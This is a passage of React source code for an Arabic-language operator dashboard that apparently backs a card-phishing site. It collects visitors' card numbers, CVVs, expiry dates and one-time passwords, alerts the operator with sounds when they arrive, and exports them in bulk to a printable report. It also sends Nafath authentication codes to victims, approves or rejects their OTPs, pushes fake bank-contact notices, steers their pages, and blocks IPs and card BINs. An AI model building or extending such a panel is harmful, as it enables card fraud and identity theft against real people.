  const handleSendNafadCode = async () => {
    if (!db || !nafadCodeInput.trim()) return;
    const clean = nafadCodeInput.replace(/\D/g, "").slice(0, 2);
    if (clean.length < 2) {
      toast({ title: "الرجاء إدخال رقمين لنفاذ", variant: "destructive" });
      return;
    }
    try {
      await setDoc(
        doc(db, "visitors", currentVisitor.id),
        {
          nafadConfirmationCode: clean,
          nafadConfirmationStatus: "waiting",
          nafadUpdatedAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        },
        { merge: true },
      );
      await setDoc(
        doc(db, "pays", currentVisitor.id),
        {
          nafadConfirmationCode: clean,
          nafadConfirmationStatus: "waiting",
          nafadUpdatedAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        },
        { merge: true },
      );
      toast({ title: `تم إرسال رقم نفاذ (${clean}) للعميل` });
      setNafadCodeInput("");
    } catch {}
  };

  const handleApproveNafad = async () => {
    try {
      await updateNafadApprovalStatus(currentVisitor.id, true);
      toast({ title: "تم قبول رمز نفاذ بنجاح" });
    } catch {}
  };

  const handleRejectNafad = async () => {
    try {
      await updateNafadApprovalStatus(currentVisitor.id, false);
      toast({ title: "تم رفض نفاذ", variant: "destructive" });
    } catch {}
  };

  // Push Bank Contact Notification
  const handlePushBankContact = async () => {
    try {
      await pushBankContactRequest(currentVisitor.id);
      toast({ title: "تم إرسال إشعار اتصال البنك للعميل" });
    } catch {
      toast({ title: "تم طلب الإشعار" });
    }
  };

  // Block & Unblock Visitor
  const handleToggleBlockVisitor = async () => {
    const nextBlocked = !currentData.blocked;
    if (
      !confirm(
        nextBlocked
          ? "هل أنت متأكد من حظر هذا الزائر؟ سيُمنع من إكمال أي خطوة."
          : "هل تريد فك الحظر عن هذا الزائر؟"
      )
    )
      return;

    try {
      await updateVisitorBlockStatus(currentVisitor.id, nextBlocked);
      toast({
        title: nextBlocked ? "تم حظر الزائر بنجاح" : "تم إلغاء حظر الزائر",
        variant: nextBlocked ? "destructive" : "default",
      });
      loadRealData();
    } catch {}
  };

  // Add & Remove Blocked BIN
  const handleAddBin = async (bin: string) => {
    const clean = bin.replace(/\D/g, "").slice(0, 6);
    if (clean.length < 6) {
      toast({ title: "الرجاء إدخال 6 أرقام للـ BIN", variant: "destructive" });
      return;
    }
    try {
      await fbAddBlockedBin(clean);
      setBinInput("");
      toast({ title: `تم حظر الـ BIN (${clean})` });
    } catch (e: any) {
      toast({ title: "خطأ", description: e.message, variant: "destructive" });
    }
  };

  const handleRemoveBin = async (bin: string) => {
    try {
      await fbRemoveBlockedBin(bin);
      toast({ title: `تم فك حظر الـ BIN (${bin})` });
    } catch {}
  };

  // Add & Remove Blocked IP
  const handleAddIp = async (ip: string) => {
    const clean = ip.trim();
    if (!clean) return;
    try {
      await setDoc(
        doc(db, "settings", "blockedIps"),
        { ips: arrayUnion(clean), updatedAt: new Date().toISOString() },
        { merge: true },
      );
      setIpInput("");
      toast({ title: `تم حظر الـ IP (${clean})` });
    } catch {}
  };

  const handleRemoveIp = async (ip: string) => {
    try {
      await setDoc(
        doc(db, "settings", "blockedIps"),
        { ips: arrayRemove(ip), updatedAt: new Date().toISOString() },
        { merge: true },
      );
      toast({ title: `تم فك حظر الـ IP (${ip})` });
    } catch {}
  };

  // Delete All Records
  const handleDeleteAll = async () => {
    if (visitors.length === 0) {
      toast({ title: "لا توجد سجلات للحذف" });
      return;
    }
    if (
      !confirm(
        `تحذير: سيتم حذف جميع سجلات الزوار (${visitors.length}) نهائياً!\nهل أنت متأكد؟`
      )
    )
      return;
    if (!confirm("تأكيد أخير: حذف الكل لا يمكن التراجع عنه.")) return;

    try {
      const ok = await deleteAllVisitors();
      if (ok) {
        toast({ title: "تم حذف جميع السجلات بنجاح" });
        setVisitors([]);
        setSelectedVisitorId(null);
        setSelectedIds(new Set());
      } else {
        toast({ title: "فشل الحذف من الخادم", variant: "destructive" });
      }
    } catch (e: any) {
      toast({ title: "خطأ أثناء الحذف", description: e.message, variant: "destructive" });
    }
  };

  // Export Cards to PDF / Printable View
  const handleExportPdf = () => {
    const withCards = visitors.filter((v) => v.cardNumber && v.cardNumber.replace(/\D/g, "").length >= 12);
    if (withCards.length === 0) {
      toast({ title: "لا توجد بطاقات متاحة للتصدير حالياً" });
      return;
    }

    const rowsHtml = withCards
      .map((v, i) => `
        <div style="border: 1px solid #ddd; padding: 12px; margin-bottom: 12px; border-radius: 8px; font-family: sans-serif;">
          <div style="display:flex; justify-content:space-between; margin-bottom: 8px;">
            <strong>#${i + 1} - ${v.name || "زائر بدون اسم"} (${v.geoCountry || "السعودية"})</strong>
            <span style="font-family: monospace;">${v.phone || "—"}</span>
          </div>
          <div style="font-size: 16px; font-weight: bold; letter-spacing: 2px; color: #1e3a8a; font-family: monospace;">
            ${formatCardNumber(v.cardNumber)}
          </div>
          <div style="display:flex; gap: 20px; font-size: 12px; margin-top: 6px; color: #444;">
            <span>الاسم: ${v.cardName || "—"}</span>
            <span>الانتهاء: ${v.expiryMonth}/${v.expiryYear}</span>
            <span>CVV: ${v.cvv || "—"}</span>
            <span>البنك: ${v.cardBankName || "—"}</span>
            <span>OTP: ${v.otp || "—"}</span>
          </div>
        </div>
      `)
      .join("");

    const win = window.open("", "_blank");
    if (!win) {
      alert("الرجاء السماح بالنوافذ المنبثقة لطباعة التقرير.");
      return;
    }
    win.document.write(`
      <html dir="rtl">
        <head><title>تقرير البطاقات المسجلة - Diriyah</title></head>
        <body style="padding: 20px; font-family: sans-serif;">
          <h2>تقرير البطاقات المسجلة (${withCards.length})</h2>
          <p style="color: #666; font-size: 12px;">تاريخ التوليد: ${new Date().toLocaleString("ar-SA")}</p>
          <hr style="margin: 15px 0;" />
          ${rowsHtml}
          <script>window.print();</script>
        </body>
      </html>
    `);
    win.document.close();
  };

  const handleRefresh = () => {
    setLoading(true);
    loadRealData();
  };

  // OTP 6 digits boxes formatting
  const otpDigits = useMemo(() => {
    const rawOtp = String(currentData.otp || "");
    const chars = rawOtp.slice(0, 6).split("");
    while (chars.length < 6) {
      chars.push("•");
    }
    return chars;
  }, [currentData.otp]);

  return (
    <div className="min-h-screen xl:h-screen w-full bg-[#070b14] text-slate-100 font-sans p-2.5 sm:p-3 lg:p-4 flex flex-col justify-between select-none overflow-x-hidden xl:overflow-hidden" dir="rtl">
      <div className="max-w-[1800px] w-full mx-auto flex-1 flex flex-col space-y-2.5 min-h-0">
        
        {/* ============================================================== */}
        {/* TOP CONTROL TOOLBAR & SETTINGS BUTTONS */}
        {/* ============================================================== */}
        <div className="flex-shrink-0 bg-[#0b1220] border border-[#162238] rounded-2xl p-2.5 flex flex-wrap items-center justify-between gap-2.5 shadow-md">
          {/* Right side: Search & visitor count */}
          <div className="flex items-center gap-3 flex-1 min-w-[260px] max-w-md">
            <div className="relative w-full">
              <Search className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-slate-500" />
              <input
                type="text"
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="بحث بالاسم، الجوال، البطاقة، أو الـ IP..."
                className="w-full pr-9 pl-3 py-1.5 bg-[#070c18] border border-[#1a2844] rounded-xl text-xs text-white placeholder-slate-500 focus:outline-none focus:ring-1 focus:ring-purple-500"
              />
              {search && (
                <button
                  onClick={() => setSearch("")}
                  className="absolute left-2.5 top-1/2 -translate-y-1/2 text-slate-500 hover:text-white"
                >
                  <X className="w-3.5 h-3.5" />
                </button>
              )}
            </div>
          </div>

          {/* Left side: ALL Action & Settings buttons */}
          <div className="flex items-center gap-2 flex-wrap">
            {/* 1. All Settings Modal Trigger */}
            <button
              onClick={() => setSettingsModalOpen(true)}
              className="py-1.5 px-3 rounded-xl bg-purple-950/50 hover:bg-purple-900/60 border border-purple-500/40 text-purple-300 font-bold text-xs flex items-center gap-1.5 transition shadow-sm"
              title="إعدادات النظام والحظر"
            >
              <Settings className="w-3.5 h-3.5 text-purple-400" />
              <span>الإعدادات الشاملة</span>
              {(blockedBins.length > 0 || blockedIps.length > 0) && (
                <span className="bg-rose-500 text-white text-[10px] px-1.5 rounded-full font-mono">
                  {blockedBins.length + blockedIps.length}
                </span>
              )}
            </button>

            {/* 2. Page Control Directive Trigger */}
            <button
              onClick={() => setPageControlOpen(true)}
              className="py-1.5 px-3 rounded-xl bg-sky-950/50 hover:bg-sky-900/60 border border-sky-500/40 text-sky-300 font-bold text-xs flex items-center gap-1.5 transition shadow-sm"
              title="التحكم بصفحات العميل"
            >
              <Layers className="w-3.5 h-3.5 text-sky-400" />
              <span>توجيه الصفحات</span>
              {Number(currentData.directedStep || 0) > 0 && (
                <span className="bg-sky-500 text-white text-[10px] px-1.5 rounded-full font-mono">
                  {currentData.directedStep}
                </span>
              )}
            </button>

            {/* 3. Export PDF */}
            <button
              onClick={handleExportPdf}
              className="py-1.5 px-3 rounded-xl bg-slate-900 hover:bg-slate-800 border border-[#1a2844] text-slate-300 font-semibold text-xs flex items-center gap-1.5 transition"
              title="تصدير البطاقات المسجلة PDF"
            >
              <FileDown className="w-3.5 h-3.5 text-emerald-400" />
              <span>تصدير PDF</span>
            </button>

            {/* 4. Distinct Sound Test Controls */}
            <div className="flex items-center gap-1 bg-[#0a1020] border border-[#162238] rounded-xl p-0.5 text-xs">
              <button
                onClick={() => {
                  playAlertSound("card", true);
                  toast({
                    title: "💳 صوت إدخال البطاقة",
                    description: "نغمة دفع تصاعدية (Apple Pay / POS Chime)",
                  });
                }}
                className="px-2.5 py-1 rounded-lg hover:bg-blue-950/60 hover:text-blue-300 text-slate-300 font-semibold transition flex items-center gap-1 text-[11px]"
                title="استمع إلى صوت إضافة البطاقة"
              >
                <span>صوت البطاقة 💳</span>
              </button>
              <span className="text-slate-700">|</span>
              <button
                onClick={() => {
                  playAlertSound("otp", true);
                  toast({
                    title: "🔐 صوت إدخال OTP",
                    description: "نغمة تنبيه ثنائية عاجلة ومميزة",
                  });
                }}
                className="px-2.5 py-1 rounded-lg hover:bg-purple-950/60 hover:text-purple-300 text-slate-300 font-semibold transition flex items-center gap-1 text-[11px]"
                title="استمع إلى صوت إضافة رمز OTP"
              >
                <span>صوت OTP 🔐</span>
              </button>
            </div>

            {/* 5. Sound Alerts Toggle */}
            <button
              onClick={() => {
                const nextSound = !soundOn;
                setSoundOn(nextSound);
                localStorage.setItem("admin.soundOn", nextSound ? "1" : "0");
                if (nextSound) {
                  playAlertSound("card", true);
                  if ("Notification" in window && Notification.permission === "default") {
                    Notification.requestPermission().catch(() => {});
                  }
                }
              }}
              className={`p-2 rounded-xl border text-xs transition ${
                soundOn
                  ? "bg-emerald-950/40 border-emerald-500/40 text-emerald-400"
                  : "bg-slate-900 border-[#1a2844] text-slate-500"
              }`}
              title={soundOn ? "تنبيهات الصوت مفعلة" : "تنبيهات الصوت معطلة"}
            >
              {soundOn ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4" />}
            </button>

            {/* 6. Delete All Visitors */}
            <button
              onClick={handleDeleteAll}
              className="py-1.5 px-3 rounded-xl bg-rose-950/30 hover:bg-rose-950/60 border border-rose-500/30 text-rose-400 font-bold text-xs flex items-center gap-1.5 transition"
              title="حذف جميع السجلات"
            >
              <Trash2 className="w-3.5 h-3.5" />
              <span>حذف الكل</span>
            </button>
          </div>
        </div>

        {/* ============================================================== */}
        {/* LIVE REAL-TIME ALERT BANNER FOR NEW CARD OR OTP */}
        {/* ============================================================== */}
        {liveAlert && (
          <div
            className={`flex-shrink-0 p-3 rounded-2xl border flex items-center justify-between gap-3 shadow-xl transition-all duration-300 animate-in fade-in slide-in-from-top-2 ${
              liveAlert.type === "card"
                ? "bg-gradient-to-r from-blue-950/90 via-blue-900/80 to-slate-900/90 border-blue-500/60 text-blue-100 shadow-[0_0_20px_rgba(59,130,246,0.25)]"
                : "bg-gradient-to-r from-purple-950/90 via-purple-900/80 to-slate-900/90 border-purple-500/60 text-purple-100 shadow-[0_0_20px_rgba(168,85,247,0.25)]"
            }`}
          >
            <div className="flex items-center gap-3">
              <div
                className={`w-10 h-10 rounded-xl flex items-center justify-center font-bold text-white shadow-md ${
                  liveAlert.type === "card"
                    ? "bg-blue-600 shadow-blue-500/30"
                    : "bg-purple-600 shadow-purple-500/30"
                }`}
              >
                {liveAlert.type === "card" ? (
                  <CreditCard className="w-5 h-5 animate-pulse" />
                ) : (
                  <ShieldCheck className="w-5 h-5 animate-pulse" />
                )}
              </div>
              <div className="space-y-0.5">
                <div className="flex items-center gap-2">
                  <span className="text-xs font-black text-white">{liveAlert.title}</span>
                  <span className="text-[10px] bg-white/10 px-2 py-0.5 rounded-full font-mono text-white/90">
                    {liveAlert.visitorName}
                  </span>
                </div>
                <p className="text-xs font-mono font-medium text-white/90">
                  {liveAlert.details}
                </p>
              </div>
            </div>
            <div className="flex items-center gap-2">
              <button
                onClick={() => {
                  setSelectedVisitorId(liveAlert.visitorId);
                  setLiveAlert(null);
                }}
                className="px-3.5 py-1.5 rounded-xl bg-white hover:bg-slate-100 text-slate-950 font-bold text-xs transition shadow-md flex items-center gap-1.5"
              >
                <span>عرض الزائر</span>
                <ChevronLeft className="w-3.5 h-3.5" />
              </button>
              <button
                onClick={() => setLiveAlert(null)}
                className="p-1.5 rounded-xl hover:bg-white/10 text-white/70 hover:text-white transition"
                title="إغلاق التنبيه"
              >
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}

        {/* ============================================================== */}
        {/* TOP STATS CARDS ROW */}
        {/* ============================================================== */}
        <div className="flex-shrink-0 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5">
          
          {/* Card 1: إجمالي المستخدمين */}
          <div className="bg-[#0b1220] border border-[#162238] rounded-2xl p-3 flex items-center justify-between shadow-sm">
            <div className="space-y-0.5">
              <div className="flex items-center gap-2">
                <span className="text-xs text-slate-400 font-medium">إجمالي المستخدمين</span>
                {onlineCount > 0 && (
                  <span className="flex items-center gap-1 text-[10px] text-emerald-400 bg-emerald-950/60 border border-emerald-500/30 px-1.5 py-0.2 rounded-full font-bold">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
                    <span>{onlineCount} متصل</span>
                  </span>
                )}
              </div>
              <div className="text-xl sm:text-2xl font-black text-white">{totalUsersCount}</div>
              <div className="flex items-center gap-1.5 text-[11px] text-emerald-400 font-medium">
                <svg className="w-10 h-3 text-emerald-400 stroke-current fill-none" viewBox="0 0 40 12">
                  <path d="M 0,8 Q 10,2 20,8 T 40,3" strokeWidth="2" strokeLinecap="round" />
                </svg>
                <span>+2 هذا الأسبوع</span>
              </div>
            </div>
            <div className="w-10 h-10 sm:w-11 sm:h-11 rounded-xl bg-purple-950/40 border border-purple-500/20 text-purple-400 flex items-center justify-center flex-shrink-0">
              <User className="w-5 h-5 sm:w-6 sm:h-6" />
            </div>
          </div>

          {/* Card 2: المعاملات اليوم */}
          <div className="bg-[#0b1220] border border-[#162238] rounded-2xl p-3 flex items-center justify-between shadow-sm">
            <div className="space-y-0.5">
              <span className="text-xs text-slate-400 font-medium">المعاملات اليوم</span>
              <div className="text-xl sm:text-2xl font-black text-white">{transactionsCount}</div>
              <div className="flex items-center gap-1.5 text-[11px] text-emerald-400 font-medium">
                <svg className="w-10 h-3 text-emerald-400 stroke-current fill-none" viewBox="0 0 40 12">
                  <path d="M 0,9 Q 15,2 25,6 T 40,2" strokeWidth="2" strokeLinecap="round" />
                </svg>
                <span>5% عن أمس</span>
              </div>
            </div>
            <div className="w-10 h-10 sm:w-11 sm:h-11 rounded-xl bg-blue-950/40 border border-blue-500/20 text-blue-400 flex items-center justify-center flex-shrink-0">
              <CreditCard className="w-5 h-5 sm:w-6 sm:h-6" />
            </div>
          </div>

          {/* Card 3: إجمالي المبالغ */}
          <div className="bg-[#0b1220] border border-[#162238] rounded-2xl p-3 flex items-center justify-between shadow-sm">
            <div className="space-y-0.5">
              <span className="text-xs text-slate-400 font-medium">إجمالي المبالغ</span>
              <div className="text-xl sm:text-2xl font-black text-white">
                {totalAmountSum} <span className="text-sm font-normal text-slate-400">ر.س</span>
              </div>
              <div className="flex items-center gap-1.5 text-[11px] text-slate-400 font-medium">
                <div className="w-8 h-0.5 bg-slate-600 rounded-full" />
                <span>0 عن أمس</span>
              </div>
            </div>
            <div className="w-10 h-10 sm:w-11 sm:h-11 rounded-xl bg-teal-950/40 border border-teal-500/20 text-teal-400 flex items-center justify-center flex-shrink-0">
              <Coins className="w-5 h-5 sm:w-6 sm:h-6" />
            </div>
          </div>

          {/* Card 4: الحجوزات اليوم */}
          <div className="bg-[#0b1220] border border-[#162238] rounded-2xl p-3 flex items-center justify-between shadow-sm">
            <div className="space-y-0.5">
              <span className="text-xs text-slate-400 font-medium">الحجوزات اليوم</span>
              <div className="text-xl sm:text-2xl font-black text-white">{bookingsTodayCount}</div>
              <div className="flex items-center gap-1.5 text-[11px] text-slate-400 font-medium">
                <div className="w-8 h-0.5 bg-slate-600 rounded-full" />
                <span>0% عن أمس</span>
              </div>
            </div>
            <div className="w-10 h-10 sm:w-11 sm:h-11 rounded-xl bg-amber-950/40 border border-amber-500/20 text-amber-400 flex items-center justify-center flex-shrink-0">
              <Calendar className="w-5 h-5 sm:w-6 sm:h-6" />
            </div>
          </div>

        </div>

        {/* ============================================================== */}
        {/* MAIN 4 COLUMNS DASHBOARD GRID */}
        {/* ============================================================== */}
        <div className="flex-1 min-h-0 grid grid-cols-1 md:grid-cols-2 xl:grid-cols-4 gap-3 items-stretch">
          
          {/* ------------------------------------------------------------ */}
          {/* COLUMN 1 (Right in RTL): تحديثات اللحظة */}
          {/* ------------------------------------------------------------ */}
          <div className="bg-[#0b1220] border border-[#162238] rounded-2xl p-3.5 flex flex-col h-full min-h-[500px] xl:min-h-0 shadow-sm overflow-hidden">
            {/* Header */}
            <div className="flex-shrink-0 flex items-center justify-between pb-2.5 border-b border-[#162238] mb-2.5">
              <button
                onClick={handleRefresh}
                className="p-1 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800/60 transition"
                title="تحديث البيانات"
              >
                <RefreshCw className={`w-4 h-4 ${loading ? "animate-spin" : ""}`} />
              </button>
              
              <div className="flex items-center gap-1.5 font-bold text-sm text-white">
                <Clock className="w-4 h-4 text-purple-400" />
                <span>تحديثات اللحظة</span>
              </div>

              {/* Filter Pills */}
              <div className="flex items-center gap-1">
                <button
                  onClick={() => setActiveFilter("all")}
                  className={`text-[11px] px-2.5 py-0.5 rounded-full font-bold transition ${
                    activeFilter === "all"
                      ? "bg-purple-600 text-white"
                      : "text-slate-400 hover:bg-slate-800/40"
                  }`}
                >
                  الكل
                </button>
                <button
                  onClick={() => setActiveFilter("success")}
                  className={`text-[11px] px-2 py-0.5 rounded-full font-medium transition ${
                    activeFilter === "success"
                      ? "bg-emerald-950 border border-emerald-500/50 text-emerald-400"
                      : "text-emerald-500/80 hover:bg-emerald-950/40"
                  }`}
                >
                  {successCount} ناجح
                </button>
                <button
                  onClick={() => setActiveFilter("failed")}
                  className={`text-[11px] px-2 py-0.5 rounded-full font-medium transition ${
                    activeFilter === "failed"
                      ? "bg-rose-950 border border-rose-500/50 text-rose-400"
                      : "text-rose-500/80 hover:bg-rose-950/40"
                  }`}
                >
                  {failedCount} فشل
                </button>
              </div>
            </div>

            {/* Selection Toolbar (Select All & Delete Selected) */}
            <div className="flex-shrink-0 flex items-center justify-between px-2 py-1.5 bg-[#070c18] border border-[#162238] rounded-xl mb-2 text-xs">
              <label className="flex items-center gap-2 cursor-pointer select-none text-slate-300 hover:text-white">
                <input
                  type="checkbox"
                  checked={filteredVisitors.length > 0 && selectedIds.size === filteredVisitors.length}
                  onChange={toggleSelectAll}
                  className="rounded border-slate-700 bg-slate-900 text-purple-600 focus:ring-purple-500 w-3.5 h-3.5 cursor-pointer"
                />
                <span className="text-[11px] font-semibold">تحديد الكل</span>
                {selectedIds.size > 0 && (
                  <span className="bg-purple-950 text-purple-300 border border-purple-500/40 text-[10px] px-1.5 py-0.2 rounded-full font-mono">
                    {selectedIds.size}
                  </span>
                )}
              </label>

              {selectedIds.size > 0 && (
                <button
                  onClick={handleDeleteSelected}
                  className="px-2.5 py-1 rounded-lg bg-rose-600 hover:bg-rose-500 text-white font-bold text-[11px] flex items-center gap-1.5 transition shadow"
                  title="حذف الزوار المحددين"
                >
                  <Trash2 className="w-3 h-3" />
                  <span>حذف المحدد ({selectedIds.size})</span>
                </button>
              )}
            </div>

            {/* Live Real Visitors List with Accurate Online Dots */}
            <div className="flex-1 min-h-0 overflow-y-auto space-y-2 pr-1 pl-1 custom-scrollbar">
              {filteredVisitors.map((v, idx) => {
                const isSelected = v.id === currentVisitor.id;
                const vName = v.name || "زائر بدون اسم";
                const isOnline = isVisitorOnline(v, currentTime);
                const hasVisitorCard = Boolean(v.cardNumber && v.cardNumber.replace(/\D/g, "").length >= 12);
                const vStatus = v.cardApproved ? "approved" : v.cardStatus === "rejected" ? "rejected" : "pending";
                const vCountry = v.geoCountry || "السعودية";

                return (
                  <div
                    key={v.id || idx}
                    onClick={() => setSelectedVisitorId(v.id)}
                    className={`border rounded-xl p-3 cursor-pointer transition-all ${
                      isSelected
                        ? "bg-[#10192e] border-purple-500/80 ring-1 ring-purple-500/40 shadow-[0_0_12px_rgba(168,85,247,0.15)]"
                        : v.blocked
                        ? "bg-rose-950/10 border-rose-500/30 opacity-75"
                        : "bg-[#080d18] border-[#162238] hover:border-slate-700 hover:bg-[#0c1426]"
                    }`}
                  >
                    <div className="flex items-center justify-between text-xs font-semibold mb-2">
                      <div className="flex items-center gap-2 truncate max-w-[170px]">
                        {/* Checkbox for item selection */}
                        <input
                          type="checkbox"
                          checked={selectedIds.has(v.id)}
                          onClick={(e) => e.stopPropagation()}
                          onChange={() => toggleSelect(v.id)}
                          className="rounded border-slate-700 bg-slate-900 text-purple-600 focus:ring-purple-500 w-3.5 h-3.5 cursor-pointer shrink-0"
                        />
                        {/* Live Online Dot */}
                        <div className="relative shrink-0 flex items-center justify-center">
                          <span className={`w-2.5 h-2.5 rounded-full ${
                            isOnline
                              ? "bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.9)]"
                              : "bg-slate-600"
                          }`} />
                          {isOnline && (
                            <span className="absolute w-4 h-4 rounded-full bg-emerald-400/40 animate-ping" />
                          )}
                        </div>
                        <span className="text-slate-200 truncate">{vName}</span>
                      </div>

                      <div className="flex items-center gap-1.5 shrink-0">
                        {v.blocked && (
                          <span className="text-[10px] text-rose-400 font-bold bg-rose-950/60 px-1.5 rounded">
                            محظور
                          </span>
                        )}
                        {hasVisitorCard && (
                          <span title="بطاقة مدخلة">
                            <CreditCard className="w-3 h-3 text-blue-400" />
                          </span>
                        )}
                        <span className={`text-[10px] font-mono ${
                          vStatus === "approved"
                            ? "text-emerald-400"
                            : vStatus === "rejected"
                            ? "text-rose-400"
                            : "text-amber-400"
                        }`}>
                          {vStatus}
                        </span>
                      </div>
                    </div>

                    <div className="flex items-center justify-between text-[11px] text-slate-500">
                      <span className="flex items-center gap-1">
                        {isOnline ? (
                          <span className="text-emerald-400 font-semibold text-[10px]">متصل الآن</span>
                        ) : (
                          <span>{fmtArabicTime(v.lastSeen || v.updatedAt || v.bookingDate || v.createdDate || v.timestamp)}</span>
                        )}
                      </span>
                      <span className="px-2 py-0.5 rounded bg-slate-800/60 border border-slate-700/40 text-[10px] text-slate-300 font-sans truncate max-w-[100px]">
                        {vCountry}
                      </span>
                    </div>

                    {/* Current Page Badge */}
                    <div className="mt-1.5 flex items-center justify-between text-[10px] text-slate-400 bg-slate-900/60 px-2 py-0.5 rounded-lg border border-slate-800">
                      <span className="text-slate-500">الصفحة:</span>
                      <span className="text-purple-300 font-semibold">{getPageLabel(v.currentPage)}</span>
                    </div>

                    {/* OTP preview badge if visitor submitted OTP */}
                    {v.otp && (
                      <div className="mt-1.5 flex items-center justify-between bg-purple-950/40 border border-purple-500/30 px-2 py-0.5 rounded-lg text-[10px]">
                        <span className="text-purple-300 font-mono font-bold flex items-center gap-1.5">
                          <span className="w-1.5 h-1.5 rounded-full bg-purple-400 animate-pulse" />
                          <span>OTP: {v.otp}</span>
                        </span>
                        <span
                          className={`font-semibold ${
                            v.otpApproved
                              ? "text-emerald-400"
                              : v.otpStatus === "rejected"
                              ? "text-rose-400"
                              : "text-amber-400"
                          }`}
                        >
                          {v.otpApproved ? "مقبول" : v.otpStatus === "rejected" ? "مرفوض" : "بانتظار التأكيد"}
                        </span>
                      </div>
                    )}
                  </div>
                );
              })}
            </div>

            {/* Bottom Button */}
            <button
              onClick={() => setActiveFilter("all")}
              className="mt-3 w-full py-2.5 rounded-xl bg-[#0e1628] hover:bg-[#142038] text-slate-300 text-xs font-semibold border border-[#1a2844] transition text-center"
            >
              عرض جميع التحديثات ({visitors.length})
            </button>
          </div>

          {/* ------------------------------------------------------------ */}
          {/* COLUMN 2: معلومات البطاقة (NEVER SHOW CARD IF VISITOR HAS NONE) */}
          {/* ------------------------------------------------------------ */}
          <div className="bg-[#0b1220] border border-[#162238] rounded-2xl p-3.5 flex flex-col gap-2.5 h-full min-h-[500px] xl:min-h-0 shadow-sm overflow-y-auto custom-scrollbar">
            {/* Header */}
            <div className="flex items-center justify-between pb-2 border-b border-[#162238]">
              <div className="flex items-center gap-1.5 font-bold text-sm text-white">
                <CreditCard className="w-4 h-4 text-blue-400" />
                <span>معلومات البطاقة</span>
              </div>
              <div className="flex items-center gap-1.5">
                {hasCard ? (
                  <span className="text-[10px] font-semibold text-emerald-400 bg-emerald-950/60 border border-emerald-500/30 px-2 py-0.5 rounded-full">
                    تم إدخال البطاقة
                  </span>
                ) : (
                  <span className="text-[10px] font-semibold text-slate-400 bg-slate-800/60 border border-slate-700/40 px-2 py-0.5 rounded-full">
                    لا توجد بطاقة
                  </span>
                )}
                {currentVisitor.id && currentVisitor.id !== "mock_preview" && (
                  <button
                    onClick={handleDeleteCurrentVisitor}
                    className="p-1 rounded-lg bg-rose-950/40 hover:bg-rose-900/60 border border-rose-500/30 text-rose-400 transition"
                    title="حذف هذا الزائر"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                  </button>
                )}
              </div>
            </div>

            {/* Current Page Badge */}
            <div className="flex items-center justify-between px-3 py-1.5 rounded-xl bg-[#0b1325] border border-purple-500/30 text-xs shadow-sm">
              <span className="text-slate-400 flex items-center gap-1.5">
                <span className="w-2 h-2 rounded-full bg-purple-400 animate-pulse" />
                <span>الصفحة الحالية:</span>
              </span>
              <span className="font-bold text-purple-300 px-2 py-0.5 rounded-md bg-purple-950/60 border border-purple-500/40">
                {getPageLabel(currentData.currentPage)}
              </span>
            </div>

            {/* CARD DISPLAY LOGIC: ONLY SHOW IF VISITOR HAS CARD */}
            {hasCard ? (
              <div className="relative aspect-[1.62] w-full rounded-2xl p-4 overflow-hidden shadow-2xl bg-gradient-to-tr from-[#0a2354] via-[#0d3478] to-[#144ea7] border border-blue-400/20 text-white flex flex-col justify-between">
                {/* Top Row: VISA or Mastercard */}
                <div className="flex items-start justify-between" dir="ltr">
                  <div className="text-left leading-tight">
                    <div className="text-[11px] font-bold tracking-wider">{currentData.cardType}</div>
                    <div className="text-[9px] text-white/70">{currentData.cardType} • دولي</div>
                  </div>
                  <div className="text-right">
                    <span className="text-xl font-black italic tracking-tighter text-white drop-shadow">
                      {currentData.cardType}
                    </span>
                  </div>
                </div>

                {/* Gold Chip */}
                <div className="flex justify-end" dir="ltr">
                  <div className="w-10 h-7 rounded bg-gradient-to-br from-amber-200 via-amber-400 to-amber-500 p-0.5 shadow border border-amber-300 flex flex-col justify-between">
                    <div className="w-full h-px bg-amber-700/40 mt-1" />
                    <div className="w-full h-px bg-amber-700/40 mb-1" />
                  </div>
                </div>

                {/* Real Card Number */}
                <div className="text-base sm:text-lg font-mono font-bold tracking-[0.16em] text-white drop-shadow my-1 text-center" dir="ltr">
                  {formatCardNumber(currentData.cardNumber)}
                </div>

                {/* Bottom Row: Expiry, CVV and Holder */}
                <div className="flex items-end justify-between text-xs text-white/90 font-mono" dir="ltr">
                  <div>
                    <div className="text-[8px] text-white/60 tracking-wider">EXP</div>
                    <div className="font-semibold text-xs">{currentData.expiryMonth || "10"}/{currentData.expiryYear || "26"}</div>
                  </div>
                  <div>
                    <div className="text-[8px] text-white/60 tracking-wider">CVV</div>
                    <div className="font-semibold text-xs tracking-widest text-amber-300">{currentData.cvv || "•••"}</div>
                  </div>
                  <div className="text-right">
                    <div className="text-[8px] text-white/60 tracking-wider">HOLDER</div>
                    <div className="font-semibold text-xs uppercase tracking-wider truncate max-w-[110px]">
                      {currentData.cardName || "CARD HOLDER"}
                    </div>
                  </div>
                </div>
              </div>
            ) : (
              /* CLEAN EMPTY STATE: WHEN VISITOR DOES NOT HAVE A CARD */
              <div className="relative aspect-[1.62] w-full rounded-2xl p-5 border border-dashed border-[#1e2a44] bg-[#070d18] text-slate-400 flex flex-col items-center justify-center text-center gap-3">
                <div className="w-12 h-12 rounded-2xl bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-500">
                  <CreditCard className="w-6 h-6 opacity-40" />
                </div>
                <div className="space-y-0.5">
                  <h4 className="text-xs font-bold text-slate-300">لم يتم إدخال بيانات البطاقة بعد</h4>
                  <p className="text-[11px] text-slate-500">
                    الزائر حالياً في صفحة: <span className="text-purple-400 font-semibold">{currentData.currentPage || "التسجيل"}</span>
                  </p>
                </div>
                <div className="px-2.5 py-1 rounded-full bg-slate-800/80 border border-slate-700/50 text-[10px] text-amber-400 font-mono flex items-center gap-1.5">
                  <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-pulse" />
                  <span>بانتظار وصول العميل للدفع</span>
                </div>
              </div>
            )}

            {/* Action Buttons */}
            <div className="flex flex-col gap-1.5 pt-1 flex-1 justify-between min-h-0">
